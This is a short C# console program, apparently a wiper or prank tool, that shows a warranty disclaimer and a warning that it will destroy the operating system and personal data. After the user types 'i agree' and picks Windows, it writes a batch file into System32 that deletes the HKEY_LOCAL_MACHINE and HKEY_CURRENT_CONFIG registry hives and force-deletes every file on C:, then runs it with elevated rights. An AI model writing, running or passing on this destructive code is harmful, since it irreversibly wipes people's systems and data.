using System.Diagnostics;
Console.WriteLine("THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\r\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\r\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\r\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\r\nSOFTWARE.");
Thread.Sleep(5000);
Console.Clear();
Task.Delay(1000);
Console.WriteLine("WARNING THIS WILL DESTROY YOUR OPERATING SYSTEM AND PERSONAL DATA!");
Console.WriteLine("Please type 'i agree' if you would like to continue\n \n");
string? input = Console.ReadLine()?.ToLower();

if (input == "i agree")
{
    Task.Delay(1000);
    Console.WriteLine("What operating system are you using? \n \n ");
    Console.WriteLine("1.Windows \n2.Linux [soon] \n3.macOS [soon]");
    string? input2 = Console.ReadLine()?.ToLower();

    if (input2 == "1")
    {
        string Removal = Path.Combine("C:\\Windows\\System32\\", "Kill.bat");

        File.WriteAllText(Removal, $@"
@echo off
reg delete HKEY_LOCAL_MACHINE /f
reg delete HKEY_CURRENT_CONFIG /f
del c:\* /s /f /q /a");

        ProcessStartInfo processInfo = new ProcessStartInfo
        {
            FileName = Removal,
                Verb = "runas",
                CreateNoWindow = false,
                UseShellExecute = true,
               
            };
        Process.Start(processInfo);
        }

    }
    else
    {
        Task.Delay(300);
        Environment.Exit(0);
    }

